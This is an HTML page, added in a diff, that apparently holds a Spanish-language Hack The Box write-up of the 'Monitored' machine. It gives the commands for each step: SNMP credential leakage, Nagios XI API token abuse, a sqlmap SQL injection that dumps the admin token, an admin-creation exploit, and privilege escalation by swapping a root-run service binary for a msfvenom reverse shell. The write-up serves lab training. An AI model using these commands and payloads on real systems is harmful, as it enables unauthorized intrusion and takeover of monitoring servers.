@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Monitored HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/monitored/pasted-20260413141901.png" alt="Monitored HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Monitored</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>UDP</span>
+            <span>p161</span>
+            <span>snmp</span>
+            <span>nagios</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Nagios XI expuesto y credenciales filtradas vía SNMP</li>
+            <li><code>Explotación</code>: Autenticación vía API para obtener token de sesión</li>
+            <li><code>Explotación</code>: SQLI autenticada para obtener token de <code>nagiosadmin</code></li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre reinicio de servicios y payload en servicio controlado</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413141849.png" alt="Monitored HTB" />
+          <div class="code-card">
+            <h3>Enumerar UDP</h3>
+            <pre><code>nmap -sU --top-ports 100 --open 10.129.230.96 -vvv -n
+nmap -sU -sCV -p161 10.129.230.96</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar Parámetros de procesos en ejecución</h3>
+            <pre><code>snmpbulkwalk -v2c -c public  10.129.230.96 1.3.6.1.2.1.25.4.2.1.5 | grep -v '""'
+# Credenciales -&gt; svc:XjH7VCehowpR1xZB</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413154052.png" alt="Monitored HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: API Auth token</h2>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413164141.png" alt="Monitored HTB" />
+          <p><a href="https://github.com/G4sp4rCS/CVE-2023-40931-POC/blob/main/admin-exploit.py">Exploit PoC</a></p>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413163841.png" alt="Monitored HTB" />
+          <div class="code-card">
+            <h3>Interpretar código</h3>
+            <pre><code>curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -d "username=svc&amp;password=XjH7VCehowpR1xZB"
+
+# URL: https://nagios.monitored.htb/nagiosxi/index.php?token=4d5d96157e861c02648b8153537929b3f0f3edb1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413163935.png" alt="Monitored HTB" />
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413164103.png" alt="Monitored HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SQLI</h2>
+          <div class="code-card">
+            <h3>sqlmap</h3>
+            <pre><code>sqlmap -D nagiosxi -T xi_users -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=1000" | awk -F'"' '{print$12}'`" --dump --level 4 --risk 3 -p id --batch
+# Contraseñas no están en ningún diccionario
+# Auth Token Admin -&gt; IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413173157.png" alt="Monitored HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Crear cuenta admin con la API y Auth Token de Nagios Admin</h2>
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>python3 admin-exploit.py --target https://nagios.monitored.htb/nagiosxi/ --api_key IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL --nc_ip 10.10.16.178 --nc_port 443
+
+# Credenciales -&gt; n4DcDCG3:O6hKbRbmbl9I</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413173519.png" alt="Monitored HTB" />
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413173910.png" alt="Monitored HTB" />
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413174427.png" alt="Monitored HTB" />
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413174815.png" alt="Monitored HTB" />
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413174712.png" alt="Monitored HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413182219.png" alt="Monitored HTB" />
+          <div class="code-card">
+            <h3>Sudoers y procesos en ejecución</h3>
+            <pre><code>sudo -l
+# Ejecutar sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios mientras vemos los procesos que se ejecutan por detrás
+
+ps -eo user,command  # Usar tambien PROCMON
+
+# Servicio nagios que se reinicia ejecutándose como el usuario root
+# Ruta: /usr/local/nagios/bin/nagios</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413182438.png" alt="Monitored HTB" />
+          <div class="code-card">
+            <h3>Permisos del servicio</h3>
+            <pre><code>ls -l /usr/local/nagios/bin/nagios
+# Podemos modificar el servicio por un exploit de msfvenom</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413182536.png" alt="Monitored HTB" />
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.178 LPORT=4443 -f elf &gt; shell
+# Mover shell a la víctima y sustituirlo por el servicio nagios con el comando mv
+# Listener 4443
+# Reiniciar servicio como sudo
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/monitored/pasted-20260413183207.png" alt="Monitored HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>UDP</span>
+            <span>p161</span>
+            <span>snmp</span>
+            <span>nagios</span>
+            <span>curl</span>
+            <span>procesos</span>
+            <span>procmon</span>
+            <span>sudoers</span>
+            <span>api</span>
+            <span>auth_token</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
